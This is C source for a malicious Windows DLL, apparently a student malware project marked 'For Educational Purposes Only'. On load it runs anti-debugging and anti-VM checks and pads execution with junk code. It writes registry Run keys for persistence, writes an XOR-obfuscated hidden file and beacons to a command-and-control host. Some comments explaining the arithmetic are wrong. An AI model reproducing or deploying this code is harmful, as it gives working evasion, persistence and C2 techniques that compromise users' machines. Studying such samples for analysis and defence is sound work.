#include <windows.h>
#include <winhttp.h>
#include <intrin.h>
#include <winreg.h>
#include <wininet.h>
#pragma comment(lib, "winhttp.lib")



//NOTE: In order for this function to work correctly, BOTH notepad AND injector need to be run in admin mode, in order to access the windows registry.
void setupPersist() {
    HKEY hKey;
    //result to check after each call to open/modify reg key, used for error handling
    LONG result;
    LONG injectorResult;
    LONG notepadResult;
    LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    //regkey needed to run on next boot
    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_WRITE, &hKey);
    //check for failure when opening reg key
    if (result != ERROR_SUCCESS) {
        return;
    }
    // where injector is to be stored for auto-run
    const char* injectorPath = "C:\\Timothy-malware.exe";

    // write key to startup injector.exe
    injectorResult = RegSetValueExA(hKey, "injector_start", 0, REG_SZ, (const BYTE*)injectorPath, strlen(injectorPath) + 1);
    //if you cannot write the reg key for the injector, close and return early, no need to attempt to write a key to start notepad
    //if the injector isn't going to run. 
    if (injectorResult != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return; 
    }
    // notepad path
    const char* notepadPath = "C:\\Windows\\System32\\notepad.exe";

    // Add notepad.exe to the run key
    notepadResult = RegSetValueExA(hKey, "Notepad", 0, REG_SZ, (const BYTE*)notepadPath, strlen(notepadPath) + 1);

    // err handling
    if (notepadResult != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return;
    }

    RegCloseKey(hKey);
    return;
}





//this is actually a junk function itself that is functionally identical to a recursive implementation of fibbonacci
int fun(int x) {

    // fake file paths to show up when running strings
    const wchar_t* filePath = L"C:\\Users\\Public\\junk_file.txt";
    const wchar_t* filePath2 = L"C:\\Windows\\junk_file2.txt";


    //this value exists to always falsify the final check 
    int b = 0; 
    int z = 1; 
    //this really is the base case that is checked first. The code will modify z in an attempt to deceive
    bool matched = (x <= z);
    //z is strictly > 0
    for (int i = 0; i < x; i++) {
        z = z + i;
    }
    // statements about b and z is always true as z only increases and b is defined 0 so it's always greater than z
    // therefore the first clause is always false, and the if is only dependent on matched (which is just te base case of a fibb function) 
    if (!(z > 1 && b < z) || matched) {
        return x;
    }
    else {
        return fun(x - 1) + fun(x - 2); 
    }
}
// junk function to pad out execution 
int junkFunc(int runs) {
    runs--;
    if (runs < 1) {
        return 0;
    }

    for (int i = 0; i < 10; i++) {
        fun(i);
    }

    return junkFunc(runs);

}
int funRunner(int x, bool adbEn, bool avmEn) {
    // debugger check
    bool debug = IsDebuggerPresent() != 0;
    //vm detection
    int cpuinfo[4] = { 0 };
    // set eax to 1 and exec cpuid instruction
    __cpuid(cpuinfo, 1); 
    //read the exc register where the hypervisor bit is stored
    int ecx = cpuinfo[2];
    //create a bitmask with a 1 on the 31 bit (where the hypervisor bit is)
    // bitwise AND with the cpuInfo to only get the hypervisor bit
    //if the result is fully zero then hypvervisor is not set.
    bool inVM = (ecx & (1 << 31)) != 0;


    //if debugger/vm present internally add a large numbers of recursive calls by skipping increasing x statically
    if (debug && adbEn) {
        //TODO: delete this, just a debug line to see if it's tripped internally
        MessageBoxA(NULL, "debugger detected", "DEBUGGER DETECTED", MB_OK);
        return fun(x + 10);
    } else if (inVM && avmEn) {
        //TODO: delete this, just a debug line to see if it's tripped internally
        MessageBoxA(NULL, "You are in a Virtual machine", "VIRUAL MACHINE DETECTED", MB_OK);
        return fun(x + 10);
    } else {
        return fun(x);
    }
}

// check if the flags passed from the injector exist in the filesystem
bool flagFileExists(const wchar_t* flagFilePath) {
    DWORD fileAtt = GetFileAttributes(flagFilePath);

    if (fileAtt == INVALID_FILE_ATTRIBUTES) return false;
    //check that the path is not a directory
    //From StackOverflow: Author Machavity and FailedDev
    //https://stackoverflow.com/questions/8233842/how-to-check-if-directory-exist-using-c-and-winapi
    if (fileAtt & FILE_ATTRIBUTE_DIRECTORY) return false;
    return true;
}

//helper function to delete the file only if it exists
void deleteFlagFile(const wchar_t* flagFilePath) {
    if (GetFileAttributes(flagFilePath) != INVALID_FILE_ATTRIBUTES) {
        DeleteFile(flagFilePath); 
    }
}

// create first flag in fs
void createFile() {
    const wchar_t* filePath = L"C:\\Users\\Public\\example.txt";
    const char * content = "plain_sight_timothy_4484";

    HANDLE file = CreateFile(filePath, GENERIC_WRITE ,0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (file != INVALID_HANDLE_VALUE)
    {
        DWORD bytesWritten;
        WriteFile(file, content, strlen(content), &bytesWritten, NULL);
        CloseHandle(file);
    }
    return;
}


//for now key is 84
//status is 4
void createHiddenFile(int key, int status) {

    //content will not be revealed unless both key and status are the correct value
    int contentKey = key / status; 
    // Obfuscated content using XOR 
    int encodedMessage[] = { 125, 124, 113, 113, 112, 123, 74, 97, 124, 120, 122, 97, 125, 108, 74, 33, 33, 45, 33 };
    
    // len of encoded message
    int messageLength = 19;

    // content is 19chars + null terminator
    char content[20]; 
    for (int i = 0; i < messageLength; ++i) {
        content[i] = (char)(encodedMessage[i] ^ contentKey);
    }
    content[messageLength] = '\0'; 

    //same process as above but to extract the filePath
    int fileKey = key;
    int filePathHidden[] = { 23, 110, 8, 1, 39, 49, 38, 39, 8, 4, 33, 54, 56, 61, 55, 8, 49, 44, 53, 57, 36, 56, 49, 11, 60, 61, 48, 48, 49, 58, 122, 32, 44, 32 };
    int filePathLength = 34;
    char filePath[35];
    for (int i = 0; i < filePathLength; ++i) {
        filePath[i] = (char)(filePathHidden[i] ^ fileKey);
    }
    filePath[filePathLength] = '\0';

    // Convert the narrow-character file path to a wide-character string
    wchar_t filePathW[35];
    MultiByteToWideChar(CP_ACP, 0, filePath, -1, filePathW, 35);

    // Create and write to the file
    HANDLE file = CreateFile(filePathW, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,  NULL);

    if (file != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(file, content, messageLength, &bytesWritten, NULL);
        CloseHandle(file);
    }
}

// connect to c2 server 
bool connectToURL() {
    HINTERNET internet = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!internet) {
        return false;
    }

    HINTERNET connection = WinHttpConnect(internet, L"c2.timothylai-4484-project.net", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connection) {
        WinHttpCloseHandle(internet);
        return false;
    }

    HINTERNET request = WinHttpOpenRequest(connection, L"GET", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(internet);
        return false;
    }

    BOOL result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!result) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(internet);
        return false;
    }

    result = WinHttpReceiveResponse(request, NULL);
    if (!result) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connection);
        WinHttpCloseHandle(internet);
        return false;
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(internet);
    return true;
}

// Using a thread because can't run HTTP functions in DLLMain()
//  from stackoverflow: https://stackoverflow.com/questions/72117991/cant-send-a-winhttp-request-in-a-dll-but-works-in-an-exe
DWORD WINAPI NetworkThread(LPVOID lpParam) {
    bool connected = connectToURL();
    return 0;
}


BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) 
{
    //MessageBoxA(NULL, "in dll", "dll", MB_OK);
    //check if flags are present
    bool antiVMEn = flagFileExists(L"C:\\Users\\Public\\antiVMPresent.txt");
    bool antiDebugEn = flagFileExists(L"C:\\Users\\Public\\antiDebugPresent.txt");
    //MessageBoxA(NULL, "flags loaded", "flags", MB_OK);
    //after reading possible flags, remove the files
    deleteFlagFile(L"C:\\Users\\Public\\antiVMPresent.txt");
    deleteFlagFile(L"C:\\Users\\Public\\antiDebugPresent.txt");
    //MessageBoxA(NULL, "flags deleted", "flags 2", MB_OK);
    //this is a trip detection, that will be set if debugger is detected
    int t = 0; 
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        MessageBoxA(NULL, "For Educational Purposes Only", "For Educational Purposes Only", MB_OK);

        junkFunc(5);


        t = funRunner(15, antiDebugEn, antiVMEn);
        //if a debugger is present, the value of t is a very large fibb number. in which case break and prevent execution of payload.
        if (t > 1000) {
            break;
        }
        //setup regkeys to have persistence
        setupPersist(); 

        //if funRunner did not detect debugger, then the output of t is the correct key for XOR de obfuscation
        createFile();
        //fun(15) is just fibb 15 = 210 + 10 = 620 / 155 = 4 which is the value that we need
        // this is all junk code to waste time
        createHiddenFile(84, ((t + 10 ) / 155)); 
        // Create a thread to handle the network operation
        CreateThread(NULL, 0, NetworkThread, NULL, 0, NULL);




        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH: 
        break;
    case DLL_PROCESS_DETACH: 
        break;
    }
    return TRUE;
}

